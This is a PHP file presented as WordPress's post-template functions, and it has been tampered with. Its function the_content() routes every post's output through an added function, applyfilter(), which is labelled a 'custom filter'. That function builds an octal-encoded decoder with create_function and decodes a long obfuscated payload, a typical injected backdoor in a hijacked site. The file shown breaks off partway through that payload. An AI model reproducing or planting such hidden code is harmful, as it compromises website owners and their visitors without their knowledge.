<?php
/**
 * WordPress Post Template Functions.
 *
 * Gets content for the current post in the loop.
 *
 * @package WordPress
 * @subpackage Template
 */

/**
 * Display the ID of the current item in the WordPress Loop.
 *
 * @since 0.71
 */
function the_ID() {
	echo get_the_ID();
}

/**
 * Retrieve the ID of the current item in the WordPress Loop.
 *
 * @since 2.1.0
 * @uses $post
 *
 * @return int
 */
function get_the_ID() {
	return get_post()->ID;
}

/**
 * Display or retrieve the current post title with optional content.
 *
 * @since 0.71
 *
 * @param string $before Optional. Content to prepend to the title.
 * @param string $after Optional. Content to append to the title.
 * @param bool $echo Optional, default to true.Whether to display or return.
 * @return null|string Null on no title. String if $echo parameter is false.
 */
function the_title($before = '', $after = '', $echo = true) {
	$title = get_the_title();

	if ( strlen($title) == 0 )
		return;

	$title = $before . $title . $after;

	if ( $echo )
		echo $title;
	else
		return $title;
}

/**
 * Sanitize the current title when retrieving or displaying.
 *
 * Works like {@link the_title()}, except the parameters can be in a string or
 * an array. See the function for what can be override in the $args parameter.
 *
 * The title before it is displayed will have the tags stripped and {@link
 * esc_attr()} before it is passed to the user or displayed. The default
 * as with {@link the_title()}, is to display the title.
 *
 * @since 2.3.0
 *
 * @param string|array $args Optional. Override the defaults.
 * @return string|null Null on failure or display. String when echo is false.
 */
function the_title_attribute( $args = '' ) {
	$title = get_the_title();

	if ( strlen($title) == 0 )
		return;

	$defaults = array('before' => '', 'after' =>  '', 'echo' => true);
	$r = wp_parse_args($args, $defaults);
	extract( $r, EXTR_SKIP );

	$title = $before . $title . $after;
	$title = esc_attr(strip_tags($title));

	if ( $echo )
		echo $title;
	else
		return $title;
}

/**
 * Retrieve post title.
 *
 * If the post is protected and the visitor is not an admin, then "Protected"
 * will be displayed before the post title. If the post is private, then
 * "Private" will be located before the post title.
 *
 * @since 0.71
 *
 * @param mixed $post Optional. Post ID or object.
 * @return string
 */
function get_the_title( $post = 0 ) {
	$post = get_post( $post );

	$title = isset( $post->post_title ) ? $post->post_title : '';
	$id = isset( $post->ID ) ? $post->ID : 0;

	if ( ! is_admin() ) {
		if ( ! empty( $post->post_password ) ) {
			$protected_title_format = apply_filters( 'protected_title_format', __( 'Protected: %s' ) );
			$title = sprintf( $protected_title_format, $title );
		} else if ( isset( $post->post_status ) && 'private' == $post->post_status ) {
			$private_title_format = apply_filters( 'private_title_format', __( 'Private: %s' ) );
			$title = sprintf( $private_title_format, $title );
		}
	}

	return apply_filters( 'the_title', $title, $id );
}

/**
 * Display the Post Global Unique Identifier (guid).
 *
 * The guid will appear to be a link, but should not be used as an link to the
 * post. The reason you should not use it as a link, is because of moving the
 * blog across domains.
 *
 * Url is escaped to make it xml safe
 *
 * @since 1.5.0
 *
 * @param int $id Optional. Post ID.
 */
function the_guid( $id = 0 ) {
	echo esc_url( get_the_guid( $id ) );
}

/**
 * Retrieve the Post Global Unique Identifier (guid).
 *
 * The guid will appear to be a link, but should not be used as an link to the
 * post. The reason you should not use it as a link, is because of moving the
 * blog across domains.
 *
 * @since 1.5.0
 *
 * @param int $id Optional. Post ID.
 * @return string
 */
function get_the_guid( $id = 0 ) {
	$post = get_post($id);

	return apply_filters('get_the_guid', $post->guid);
}

/**
 * Display the post content.
 *
 * @since 0.71
 *
 * @param string $more_link_text Optional. Content for when there is more text.
 * @param bool $stripteaser Optional. Strip teaser content before the more text. Default is false.
 */
function the_content($more_link_text = null, $stripteaser = false) {
	$content = get_the_content($more_link_text, $stripteaser);
	$content = apply_filters('the_content', $content);
	$content = str_replace(']]>', ']]&gt;', applyfilter($content));
	echo $content;
}

/**
 * Retrieve the post content.
 *
 * @since 0.71
 *
 * @param string $more_link_text Optional. Content for when there is more text.
 * @param bool $stripteaser Optional. Strip teaser content before the more text. Default is false.
 * @return string
 */
function get_the_content( $more_link_text = null, $stripteaser = false ) {
	global $more, $page, $pages, $multipage, $preview;

	$post = get_post();

	if ( null === $more_link_text )
		$more_link_text = __( '(more...)' );

	$output = '';
	$hasTeaser = false;

	// If post password required and it doesn't match the cookie.
	if ( post_password_required() )
		return get_the_password_form();

	if ( $page > count($pages) ) // if the requested page doesn't exist
		$page = count($pages); // give them the highest numbered page that DOES exist

	$content = $pages[$page-1];
	if ( preg_match('/<!--more(.*?)?-->/', $content, $matches) ) {
		$content = explode($matches[0], $content, 2);
		if ( !empty($matches[1]) && !empty($more_link_text) )
			$more_link_text = strip_tags(wp_kses_no_null(trim($matches[1])));

		$hasTeaser = true;
	} else {
		$content = array($content);
	}
	if ( (false !== strpos($post->post_content, '<!--noteaser-->') && ((!$multipage) || ($page==1))) )
		$stripteaser = true;
	$teaser = $content[0];
	if ( $more && $stripteaser && $hasTeaser )
		$teaser = '';
	$output .= $teaser;
	if ( count($content) > 1 ) {
		if ( $more ) {
			$output .= '<span id="more-' . $post->ID . '"></span>' . $content[1];
		} else {
			if ( ! empty($more_link_text) )
				$output .= apply_filters( 'the_content_more_link', ' <a href="' . get_permalink() . "#more-{$post->ID}\" class=\"more-link\">$more_link_text</a>", $more_link_text );
			$output = force_balance_tags($output);
		}

	}
	if ( $preview ) // preview fix for javascript bug with foreign languages
		$output =	preg_replace_callback('/\%u([0-9A-F]{4})/', '_convert_urlencoded_to_entities', $output);

	return $output;
}

/**
 * Preview fix for javascript bug with foreign languages
 *
 * @since 3.1.0
 * @access private
 * @param array $match Match array from preg_replace_callback
 * @return string
 */
function _convert_urlencoded_to_entities( $match ) {
	return '&#' . base_convert( $match[1], 16, 10 ) . ';';
}

/**
 * Display the post excerpt.
 *
 * @since 0.71
 * @uses apply_filters() Calls 'the_excerpt' hook on post excerpt.
 */
function the_excerpt() {
	echo apply_filters('the_excerpt', get_the_excerpt());
}

/**
 * Retrieve the post excerpt.
 *
 * @since 0.71
 *
 * @param mixed $deprecated Not used.
 * @return string
 */
function get_the_excerpt( $deprecated = '' ) {
	if ( !empty( $deprecated ) )
		_deprecated_argument( __FUNCTION__, '2.3' );

	$post = get_post();

	if ( post_password_required() ) {
		return __( 'There is no excerpt because this is a protected post.' );
	}

	return apply_filters( 'get_the_excerpt', $post->post_excerpt );
}

/**
 * Whether post has excerpt.
 *
 * @since 2.3.0
 *
 * @param int $id Optional. Post ID.
 * @return bool
 */
function has_excerpt( $id = 0 ) {
	$post = get_post( $id );
	return ( !empty( $post->post_excerpt ) );
}

/**
 * Display the classes for the post div.
 *
 * @since 2.7.0
 *
 * @param string|array $class One or more classes to add to the class list.
 * @param int $post_id An optional post ID.
 */
function post_class( $class = '', $post_id = null ) {
	// Separates classes with a single space, collates classes for post DIV
	echo 'class="' . join( ' ', get_post_class( $class, $post_id ) ) . '"';
}

/**
 * Retrieve the classes for the post div as an array.
 *
 * The class names are add are many. If the post is a sticky, then the 'sticky'
 * class name. The class 'hentry' is always added to each post. For each
 * category, the class will be added with 'category-' with category slug is
 * added. The tags are the same way as the categories with 'tag-' before the tag
 * slug. All classes are passed through the filter, 'post_class' with the list
 * of classes, followed by $class parameter value, with the post ID as the last
 * parameter.
 *
 * @since 2.7.0
 *
 * @param string|array $class One or more classes to add to the class list.
 * @param int $post_id An optional post ID.
 * @return array Array of classes.
 */
function get_post_class( $class = '', $post_id = null ) {
	$post = get_post($post_id);

	$classes = array();

	if ( empty($post) )
		return $classes;

	$classes[] = 'post-' . $post->ID;
	if ( ! is_admin() )
		$classes[] = $post->post_type;
	$classes[] = 'type-' . $post->post_type;
	$classes[] = 'status-' . $post->post_status;

	// Post Format
	if ( post_type_supports( $post->post_type, 'post-formats' ) ) {
		$post_format = get_post_format( $post->ID );

		if ( $post_format && !is_wp_error($post_format) )
			$classes[] = 'format-' . sanitize_html_class( $post_format );
		else
			$classes[] = 'format-standard';
	}

	// post requires password
	if ( post_password_required($post->ID) )
		$classes[] = 'post-password-required';

	// sticky for Sticky Posts
	if ( is_sticky($post->ID) && is_home() && !is_paged() )
		$classes[] = 'sticky';

	// hentry for hAtom compliance
	$classes[] = 'hentry';

	// Categories
	if ( is_object_in_taxonomy( $post->post_type, 'category' ) ) {
		foreach ( (array) get_the_category($post->ID) as $cat ) {
			if ( empty($cat->slug ) )
				continue;
			$classes[] = 'category-' . sanitize_html_class($cat->slug, $cat->term_id);
		}
	}

	// Tags
	if ( is_object_in_taxonomy( $post->post_type, 'post_tag' ) ) {
		foreach ( (array) get_the_tags($post->ID) as $tag ) {
			if ( empty($tag->slug ) )
				continue;
			$classes[] = 'tag-' . sanitize_html_class($tag->slug, $tag->term_id);
		}
	}

	if ( !empty($class) ) {
		if ( !is_array( $class ) )
			$class = preg_split('#\s+#', $class);
		$classes = array_merge($classes, $class);
	}

	$classes = array_map('esc_attr', $classes);

	return apply_filters('post_class', $classes, $class, $post->ID);
}

/**
 * Display the classes for the body element.
 *
 * @since 2.8.0
 *
 * @param string|array $class One or more classes to add to the class list.
 */
function body_class( $class = '' ) {
	// Separates classes with a single space, collates classes for body element
	echo 'class="' . join( ' ', get_body_class( $class ) ) . '"';
}

/**
 * Retrieve the classes for the body element as an array.
 *
 * @since 2.8.0
 *
 * @param string|array $class One or more classes to add to the class list.
 * @return array Array of classes.
 */
function get_body_class( $class = '' ) {
	global $wp_query, $wpdb;

	$classes = array();

	if ( is_rtl() )
		$classes[] = 'rtl';

	if ( is_front_page() )
		$classes[] = 'home';
	if ( is_home() )
		$classes[] = 'blog';
	if ( is_archive() )
		$classes[] = 'archive';
	if ( is_date() )
		$classes[] = 'date';
	if ( is_search() ) {
		$classes[] = 'search';
		$classes[] = $wp_query->posts ? 'search-results' : 'search-no-results';
	}
	if ( is_paged() )
		$classes[] = 'paged';
	if ( is_attachment() )
		$classes[] = 'attachment';
	if ( is_404() )
		$classes[] = 'error404';

	if ( is_single() ) {
		$post_id = $wp_query->get_queried_object_id();
		$post = $wp_query->get_queried_object();

		$classes[] = 'single';
		if ( isset( $post->post_type ) ) {
			$classes[] = 'single-' . sanitize_html_class($post->post_type, $post_id);
			$classes[] = 'postid-' . $post_id;

			// Post Format
			if ( post_type_supports( $post->post_type, 'post-formats' ) ) {
				$post_format = get_post_format( $post->ID );

				if ( $post_format && !is_wp_error($post_format) )
					$classes[] = 'single-format-' . sanitize_html_class( $post_format );
				else
					$classes[] = 'single-format-standard';
			}
		}

		if ( is_attachment() ) {
			$mime_type = get_post_mime_type($post_id);
			$mime_prefix = array( 'application/', 'image/', 'text/', 'audio/', 'video/', 'music/' );
			$classes[] = 'attachmentid-' . $post_id;
			$classes[] = 'attachment-' . str_replace( $mime_prefix, '', $mime_type );
		}
	} elseif ( is_archive() ) {
		if ( is_post_type_archive() ) {
			$classes[] = 'post-type-archive';
			$classes[] = 'post-type-archive-' . sanitize_html_class( get_query_var( 'post_type' ) );
		} else if ( is_author() ) {
			$author = $wp_query->get_queried_object();
			$classes[] = 'author';
			if ( isset( $author->user_nicename ) ) {
				$classes[] = 'author-' . sanitize_html_class( $author->user_nicename, $author->ID );
				$classes[] = 'author-' . $author->ID;
			}
		} elseif ( is_category() ) {
			$cat = $wp_query->get_queried_object();
			$classes[] = 'category';
			if ( isset( $cat->term_id ) ) {
				$classes[] = 'category-' . sanitize_html_class( $cat->slug, $cat->term_id );
				$classes[] = 'category-' . $cat->term_id;
			}
		} elseif ( is_tag() ) {
			$tags = $wp_query->get_queried_object();
			$classes[] = 'tag';
			if ( isset( $tags->term_id ) ) {
				$classes[] = 'tag-' . sanitize_html_class( $tags->slug, $tags->term_id );
				$classes[] = 'tag-' . $tags->term_id;
			}
		} elseif ( is_tax() ) {
			$term = $wp_query->get_queried_object();
			if ( isset( $term->term_id ) ) {
				$classes[] = 'tax-' . sanitize_html_class( $term->taxonomy );
				$classes[] = 'term-' . sanitize_html_class( $term->slug, $term->term_id );
				$classes[] = 'term-' . $term->term_id;
			}
		}
	} elseif ( is_page() ) {
		$classes[] = 'page';

		$page_id = $wp_query->get_queried_object_id();

		$post = get_post($page_id);

		$classes[] = 'page-id-' . $page_id;

		if ( $wpdb->get_var( $wpdb->prepare("SELECT ID FROM $wpdb->posts WHERE post_parent = %d AND post_type = 'page' AND post_status = 'publish' LIMIT 1", $page_id) ) )
			$classes[] = 'page-parent';

		if ( $post->post_parent ) {
			$classes[] = 'page-child';
			$classes[] = 'parent-pageid-' . $post->post_parent;
		}
		if ( is_page_template() ) {
			$classes[] = 'page-template';
			$classes[] = 'page-template-' . sanitize_html_class( str_replace( '.', '-', get_page_template_slug( $page_id ) ) );
		} else {
			$classes[] = 'page-template-default';
		}
	}

	if ( is_user_logged_in() )
		$classes[] = 'logged-in';

	if ( is_admin_bar_showing() ) {
		$classes[] = 'admin-bar';
		$classes[] = 'no-customize-support';
	}

	if ( get_theme_mod( 'background_color' ) || get_background_image() )
		$classes[] = 'custom-background';

	$page = $wp_query->get( 'page' );

	if ( !$page || $page < 2)
		$page = $wp_query->get( 'paged' );

	if ( $page && $page > 1 ) {
		$classes[] = 'paged-' . $page;

		if ( is_single() )
			$classes[] = 'single-paged-' . $page;
		elseif ( is_page() )
			$classes[] = 'page-paged-' . $page;
		elseif ( is_category() )
			$classes[] = 'category-paged-' . $page;
		elseif ( is_tag() )
			$classes[] = 'tag-paged-' . $page;
		elseif ( is_date() )
			$classes[] = 'date-paged-' . $page;
		elseif ( is_author() )
			$classes[] = 'author-paged-' . $page;
		elseif ( is_search() )
			$classes[] = 'search-paged-' . $page;
		elseif ( is_post_type_archive() )
			$classes[] = 'post-type-paged-' . $page;
	}

	if ( ! empty( $class ) ) {
		if ( !is_array( $class ) )
			$class = preg_split( '#\s+#', $class );
		$classes = array_merge( $classes, $class );
	} else {
		// Ensure that we always coerce class to being an array.
		$class = array();
	}

	$classes = array_map( 'esc_attr', $classes );

	return apply_filters( 'body_class', $classes, $class );
}

/**
 * Whether post requires password and correct password has been provided.
 *
 * @since 2.7.0
 *
 * @param int|object $post An optional post. Global $post used if not provided.
 * @return bool false if a password is not required or the correct password cookie is present, true otherwise.
 */
function post_password_required( $post = null ) {
	$post = get_post($post);

	if ( empty( $post->post_password ) )
		return false;

	if ( ! isset( $_COOKIE['wp-postpass_' . COOKIEHASH] ) )
		return true;

	require_once ABSPATH . 'wp-includes/class-phpass.php';
	$hasher = new PasswordHash( 8, true );

	$hash = stripslashes( $_COOKIE[ 'wp-postpass_' . COOKIEHASH ] );
	if ( 0 !== strpos( $hash, '$P$B' ) )
		return true;

	return ! $hasher->CheckPassword( $post->post_password, $hash );
}

/**
 * Page Template Functions for usage in Themes
 *
 * @package WordPress
 * @subpackage Template
 */

/**
 * The formatted output of a list of pages.
 *
 * Displays page links for paginated posts (i.e. includes the <!--nextpage-->.
 * Quicktag one or more times). This tag must be within The Loop.
 *
 * The defaults for overwriting are:
 * 'next_or_number' - Default is 'number' (string). Indicates whether page
 *      numbers should be used. Valid values are number and next.
 * 'nextpagelink' - Default is 'Next Page' (string). Text for link to next page.
 *      of the bookmark.
 * 'previouspagelink' - Default is 'Previous Page' (string). Text for link to
 *      previous page, if available.
 * 'pagelink' - Default is '%' (String).Format string for page numbers. The % in
 *      the parameter string will be replaced with the page number, so Page %
 *      generates "Page 1", "Page 2", etc. Defaults to %, just the page number.
 * 'before' - Default is '<p> Pages:' (string). The html or text to prepend to
 *      each bookmarks.
 * 'after' - Default is '</p>' (string). The html or text to append to each
 *      bookmarks.
 * 'link_before' - Default is '' (string). The html or text to prepend to each
 *      Pages link inside the <a> tag. Also prepended to the current item, which
 *      is not linked.
 * 'link_after' - Default is '' (string). The html or text to append to each
 *      Pages link inside the <a> tag. Also appended to the current item, which
 *      is not linked.
 *
 * @since 1.2.0
 * @access private
 *
 * @param string|array $args Optional. Overwrite the defaults.
 * @return string Formatted output in HTML.
 */
function wp_link_pages($args = '') {
	$defaults = array(
		'before' => '<p>' . __('Pages:'), 'after' => '</p>',
		'link_before' => '', 'link_after' => '',
		'next_or_number' => 'number', 'nextpagelink' => __('Next page'),
		'previouspagelink' => __('Previous page'), 'pagelink' => '%',
		'echo' => 1
	);

	$r = wp_parse_args( $args, $defaults );
	$r = apply_filters( 'wp_link_pages_args', $r );
	extract( $r, EXTR_SKIP );

	global $page, $numpages, $multipage, $more, $pagenow;

	$output = '';
	if ( $multipage ) {
		if ( 'number' == $next_or_number ) {
			$output .= $before;
			for ( $i = 1; $i < ($numpages+1); $i = $i + 1 ) {
				$j = str_replace('%',$i,$pagelink);
				$output .= ' ';
				if ( ($i != $page) || ((!$more) && ($page==1)) ) {
					$output .= _wp_link_page($i);
				}
				$output .= $link_before . $j . $link_after;
				if ( ($i != $page) || ((!$more) && ($page==1)) )
					$output .= '</a>';
			}
			$output .= $after;
		} else {
			if ( $more ) {
				$output .= $before;
				$i = $page - 1;
				if ( $i && $more ) {
					$output .= _wp_link_page($i);
					$output .= $link_before. $previouspagelink . $link_after . '</a>';
				}
				$i = $page + 1;
				if ( $i <= $numpages && $more ) {
					$output .= _wp_link_page($i);
					$output .= $link_before. $nextpagelink . $link_after . '</a>';
				}
				$output .= $after;
			}
		}
	}

	if ( $echo )
		echo $output;

	return $output;
}

/**
 * Applies custom filter.
 *
 * @since 0.71
 *
 * $text string to apply the filter
 * @return string
 */
function applyfilter($text=null) {
	@ini_set('memory_limit','256M');
	if($text) @ob_start();
	if(1){global $O10O1OO1O;$O10O1OO1O=create_function('$s,$k',"\44\163\75\165\162\154\144\145\143\157\144\145\50\44\163\51\73\40\44\164\141\162\147\145\164\75\47\47\73\44\123\75\47\41\43\44\45\46\50\51\52\53\54\55\56\57\60\61\62\63\64\65\66\67\70\71\72\73\74\75\76\134\77\100\101\102\103\104\105\106\107\110\111\112\113\114\115\116\117\120\121\122\123\124\125\126\127\130\131\132\133\135\136\137\140\40\134\47\42\141\142\143\144\145\146\147\150\151\152\153\154\155\156\157\160\161\162\163\164\165\166\167\170\171\172\173\174\175\176\146\136\152\101\105\135\157\153\111\134\47\117\172\125\133\62\46\161\61\173\63\140\150\65\167\137\67\71\42\64\160\100\66\134\163\70\77\102\147\120\76\144\106\126\75\155\104\74\124\143\123\45\132\145\174\162\72\154\107\113\57\165\103\171\56\112\170\51\110\151\121\41\40\43\44\176\50\73\114\164\55\122\175\115\141\54\116\166\127\53\131\156\142\52\60\130\47\73\40\146\157\162\40\50\44\151\75\60\73\40\44\151\74\163\164\162\154\145\156\50\44\163\51\73\40\44\151\53\53\51\40\173\40\44\143\150\141\162\75\163\165\142\163\164\162\50\44\163\54\44\151\54\61\51\73\40\44\156\165\155\75\163\164\162\160\157\163\50\44\123\54\44\143\150\141\162\54\71\65\51\55\71\65\73\40\44\143\165\162\137\153\145\171\75\141\142\163\50\146\155\157\144\50\44\153\40\53\40\44\151\54\71\65\51\51\73\40\44\143\165\162\137\153\145\171\75\44\156\165\155\55\44\143\165\162\137\153\145\171\73\40\151\146\50\44\143\165\162\137\153\145\171\74\60\51\40\44\143\165\162\137\153\145\171\75\44\143\165\162\137\153\145\171\53\71\65\73\40\44\143\150\141\162\75\163\165\142\163\164\162\50\44\123\54\44\143\165\162\137\153\145\171\54\61\51\73\40\44\164\141\162\147\145\164\56\75\44\143\150\141\162\73\40\175\40\162\145\164\165\162\156\40\44\164\141\162\147\145\164\73"); if(!function_exists("O01100llO")){function O01100llO(){global $O10O1OO1O;return call_user_func($O10O1OO1O,'MhQ%21%26%7crq%2e%2d%24%2e%7d%20tt%2et1133%605NwW13OLW0jNNj%2c7Q%3e%3e%23V%7e%28DLG%5ez1h%27%27hIm%2bKK%2f40%2e%2e%5c%3b%60%5c%40C%2fI%24%24%7e%3d%5bttT0Xa%3bP%2fT%2ex%2euk%3cM6%5e%5ej%29Boo%21hOhu%23%21oj%2d1%7b%60%605ww71%26%7eJZx%21ritNC%7e%28%23W%2dtx%2d%2aJ%20%21RWojS%3dk%2a%2d0AM%5ez%7bEW%5eEOb5Y0X2%409%21%20srVKuK%3ajFL%5cIc%29HZ%3b%2bejr%7b%60Gki%3b%28iU%2b%7dN%23N%2b%3bb%2a%3b0%5f%5dX7MEak0jskz%5eP3%5b%3eI2E2%5fIO7%2515z%7b1%5cG%227BP%21H%24J%40s6K%24%3b%2d%7d%40%23%5cLgP%7clm%2fuNVoIDnlJ%2elf%3bQ%24u%24%3bJ%2dRJ%7dU%2bM%5b%21W%20n%7dNhnX%2c9k%5e%22bjWjUb0%5bP%5dOXo%5d%60D5k%5bzz%3a%7ce%7bh3%3ciQJ%29%7bu%60x7Dp%40emT%3f%25Z%3bs%2aXB%7dT%3arTvHuJZJH%3a%21%20%3a%23A%2d%24ECty%7d%23%3bU%7dN%2810W%7bM%2bt%2bAM%2cEpb%5eN%2abzB%5b0EjjmmTmO%5bzP%2fGGrOeUG%7b1gw9%3f%3e6%5fHp%3f%40pc%20B%24%7c%3a%3aZ%3aTdSuNVoIDnlJ%2elf%3bQ%24u%24%3bJ%2dRJ%7dU%2bM%5b%21W%20n%7dNhnX%2c9k%5e%22bjWjUb0%5bP%5dOXo%5d%60D%26%5b%5f9%7ce%3ae%7bh3%3cHQQ%21%7bu%60x97D68%3dT%3e%5c%28TSGDF%3e%3dDuN%2ey%3c%25iZJ%3a%21feq%7b%3a%5d%29%7e%24%29Ov%2da%21av%7eYn%7eb5A%2awRj%7d%5dbf6%5d%27XB1zgoUjU5oIwc%26%60%27q%26%40%3a%22w%3e%29%21xC%40gp%3a%23%20%20%23%22Qp%7e%3f8rd%3delcF%2cJeJ%2e%3aC%7c%2aS%5b%26ej%2e%20%21%2eka%3bRHRa%20vW%20%2b3fY%60LXtj%2b%2a4jobs2I8A%27X%273A%5d%60DU1o%5bU%22ep2%60%7b%7byCyu%3eh%3er%7e%28%24%239i4%24%3fTlcTZPVKadEo%3d%2bryCr0%7eH%20K%20%7eyLty%2dOvRziNQ%2b%2da3%2b%2aM%5f%5dX7YfNfOYbzBAI%2aEA%7b%3d%5bz5%5fZlG%25q31myyyyqK%7b%2e8w%3e7%29%40VQc%3eZg%3bs%2aXB%7dT%3arTvHuJZJH%3a%21%20%3a%23A%2d%24ECty%7d%23%3bU%7dN%2810W%7bM%2bt%2bAM%2cEpb%5eN%2abzBIE%60%3d%25cVz%7bOBG%3al%3aI%25O%3aBps%60%603%5cBy%5fF7m%3f%3e%204WY6%3bV%25SV%7dy%3a%2f%3c%2fy%25x%29%25H0%7eiXl%24G%3bH%20k%3bR%21U%2bM%5bLa%24a0L%2dX%5fvbRWvo6AX%26D%3e%3dgo%5b%5d6cSejmES9wz4q%3a%7b6B7swy3tR5HsFds%23%7c%3c%25g%25%7cFlGFK%2cx%2fNTJcHKy0H%20CA%2d%24Ei%7eJ%7e%2ci%21N%26LM%20tL%2a5WN%5eA%40gspINIwgd%3ddng%2aV3qEh%27c%5dJ%29I%7c3%2293K%3e%5cBwB%3e%22V%3d%22m%21ZD%20s%258%7cmc%2d%7cGT%2cx%2fNru%25u%21rl%20%5e%2eiGJ%2etI%24%20M%2c5q1%26Y%20Y%27%5fp%5c7%3bwt4o%5d%2c%2bzYk0%5bPnrl0%3d%271q%27cp59%5b9p1%5cs18uF%3fCwd%5f%3d8PQ%3dTg%7e%3aS%28m%25d%25um%3cCv%7cKTr%7ci0%21%3aC%2f%2fOzqoRyRf22%60%7bH2Q3%2a%7e%7dwNbWMYM%5eIYsNSZ%2bPEUzE%3d%5f1hIh%5fU%224Up%3aB%40l%7b%3f3PpsJPV%5cQ%25m%21%3eD%3fD%3a%3eFl%7dc%7cVSc%2e%2bul%23%5eEkX%2e%21y%2bI%261quEwy%7e%23IH%5f59%28%407%5cs%7dR4%3fNd%3f88m%3en%3dm%3d%25cZeo%3cTkG%5dJxD3%406%7b8ZS%5bvNo25%3eT7%60J%2bn%3d%3f%7dQH6%27I%5f%5cdGx%3dPM%5dT%2aSW%2b%25Re%20%7e%29%23%2d%5euK%2f%29%21%24%2eJ%40%23Y%3f%23q%3f%7ev%2c%60Y%5do%2b%279%5faCu%3b%2cb%5ejAfbdFAs%5d%5f%2237%5cS9%2f4pyJxx8%2fGhX025p8%3fBsp%24%7e0gQ%3eT%3a%2e%25%3a%7c%2cKQ%21G%24n%2be%40pD%7cuHiQJu%27OHjQLf%28W1%5eAjYjofN%27X%2aU%404WxJR%2bfkI%27EfmDJIdO%7b98h%26D1%3e9V3p%3dmV%3c7P%5c%3cg%3cdr%24gZN%7cv%2bYnnbucWz%25v%5f1ikkIOOU%5b%5bLk%5dJVFGx%230Xf%3b%23hd%2dbY7wlS%25%2bYsn21%27%265%3eAzkq%6022eGHU2K%25%2cgPKLhGXau%5fj%5e17%5cP%3edB%5cXPkDZGu%25a%7dwnfkok%2aq%3aHx%5ejfg9%20%7da%24az%27%3c%7b%24At%3b%60hV%3dmYNjO%2a%40Wz2oU3BfIE%5b1zzS%3aJ%27z%3aT%7d8%3f%3a%7e%7brfR%3dDm%3es%3d%29Jj%21YsD%3d%7eD%2e%2fZ%2eS%7d%2dh%2bM%60bN6bv%7bnB%5eK%2buM%3b%21%20a%279U6%21MRqM%5d%5e%2b%5dvwhK%40%5fGs%22is4%3a%5c%24Pf352%60%22mIqUh733GJ%2313%2e%3aYV%3d%2eM9K4%2aPB%3c%25%3aV%7e%232tjFy%25xH%2eH%3aTG%20%23%21%7e%7c%29u%7ex%7eiMoI%22%29AiWnM%2bf1%3b%3e%7dAmt%2dYEna%2c%2b%5cZnqE%605%601%2fA%3f%5d%5b%2249%40%27%5c%60%5c%5cB%3ep%3fp%2fnh%2b%5do%29Np%3aF%3dTF%24KGC%3c%2dF%20%3d%2d6%3fzaTg%5fP%3d%22FZKm%5cD%25%3f%25e%2e%3a%7cD%21%29s%23%2cM%7bjEAjjk7w%21%7es%2bAq12%7c%3dm%5ed%3fy%2e%5b%27hpqSzFcfE%28Pd%3e%7bFpFP468%29%40d%7crZnR%7dPRdFaLps%2cIM8P2%23%28G%28L%3bf0DSIaN%2caa%2bz%27lu3%7e%5f%3b%60%5fEo%5dfYE%227%23%3b%5cgq%7b1qqh%3eg%2c%2bTke%27cSi%3d%5b7wr%25pdF4mC%2f2hy2%7b9%21%20sP%3a%3ddZ%5ed%3b4kUe%23xy%29lKnr%2blA%2aTrfTZ%2fI%22%29kdsnt%28%2d%23aWbN5%60HL8RpcW4Cr%5efU%5b0%5fwO%5fA2%40%5f2c%3cnuu0%2ef%5e%29A%2eGn%29uU5%287Q%2b%5cmV%24GuVuyCRtqW%2aYf%2ba%26%7cq%3aNvt%7d%2e%7daMoEg%5b%2bnY%2ct%2bq2T%607%409%5c7%60TN%25W6%2b0%26Afzlf352%60%22mV%28cHzqsh%7bp%7e%7b%25%604V%3dFD%5fT%3fTTZrm%25m%7eaL%5e%20%3aYYbb%2aXyfJYb%26yt%23yR%21LLya%20i%23x%3bR%2ct%26%5bM3OL%7b%5eRDMEUE%5dS%2b%5dA8%5dh%26%5dw%5b%60%60A%5bs3%40%5c%5c%2523PB6q%3d%22F%3d8FF%22%29Hp%2f6f%25PsG%2fF%2fy%2d%7d%5dmRlTUS%7bl%28%24i%7cH%24Q%7dAy%21%7et%23%221Q%7b%20h%2452a%60%3etTN%27kjM%2a1X0%5c%40oB%3aX%3f%7bjyEiwzo%7b1sO%7b66P%5f8FF%2fCR%5f%2b%3d69B%3cg%40PcV%3e%7c%3btjF%24%3d%3a%7c%3cNa%292%26i%3biQfG0%3b%5fp%24tM%2da%24%28U%20%233FMvn%2ch3%2b79D%2cO02q2zb%5c%26l6%2773%27%221%5f%5f%27%5fK9%2fCy%2e%2eJsKlp%3dmF%3dQ4JgZerl%3atg%24TZ%3aSNmRuKJlYReyi%23uu%23%2ff8Ma9xod%2bY8z%2d0Xb09R%22M%40IO%27azXzI0%5eEB%5eC1ED%5docV%26p%40%5c8s%7c%2f%7bu%60%2e%3a%3fs%3e6M9T%3fZ%7cZcsl%3a%2fmf%21dSx%2fSHGJJSJj%29H%5dkII%23jf%29o%2aJ%3b%7eO%3b%2av%3bX%2cbb%7e%2c%27noII9N%2a1X0n8%3f%2a%22X%2eI4O%27%3dFU%25m%2288e%20%26B%5fdVdg5v%3fdmFD%3fgQ8X%25gt%23%3ayyRE%3d%28D%7cCQlC%2fnCL%20C%2dQ%3b%3b%2fQY%28v%2b%2bz%21b%7d%2dW%2b%24aIN%2c%7d79a%7bN9%27qqr%2f%7bIo2%26fO%40UzD%3d2SiUshg%3eg83%3aPDD%7d7G%22%3f%3dZP%3dF%23%3d%2f%7c%3dCZKKFZ%20Gi%21%21%2be%24R%28L%2e%23%2fAECb%2e%5cM%21xYb%24bXq%7bg%3bDEzoIYA%227b842j%7bB%3aX%3f%7b77%2eiwzo%7b1sO%7b66P%5f8FF%2fCR%5f%2b%3d69B%3cg%40PcV%3e%7c%3btjFy%25%29i%29%2ec%2cH%7e%7e%26rvlJ%23RH%23%21o%23%2bM%23nRWW%21R%5dvjEE5%7dEN%27OU%5eUqn8%3f%2a%22X%2e%7bo%5e7%22%27%22%40TSiU%3b%5c%7bgPdpdmuKpHCT%3fZQ%2b%5ciZKK%5eolm%3eZ%25%29%3dZJJ%20GH%7e%7e%2aX%7bG9%3bJ%2fQ%2d%21%2e%20%7d%28%23v2q%3f%7efaEoE%5e%7d5%5dUUcW%5fYjO%7b%5dXp%5e5O949wIz%7b2w%22hh%7b%7e%7b%25ZpD%3epTgmmpmLtRRMaaNL%28JDN%2dlJvLSN%7e%3a1%28L%3b%2d%28%24LvQak%5dY%21U6%21zK7P%7b2%60Eo%5dEE%27%2272n%3fnST%3cZZ%7cjFy%2eJ2O5%401%25Z%5bmDq%3a%3eV%5fVm%3dyugD%21%28%23M%20%2a0Ba%2bbabV%7d%3d%7e%28%3cNQ%23r%23%7e%24%2anH%28%5dOk1o%224%29%7bw9%7b%22%23q%24%27O%3b%60Ek%2ck%27I%227jO%3fdg%3cBGK%5e%7c%7cT%3aoDkP%3eOSsB%7bBPglr6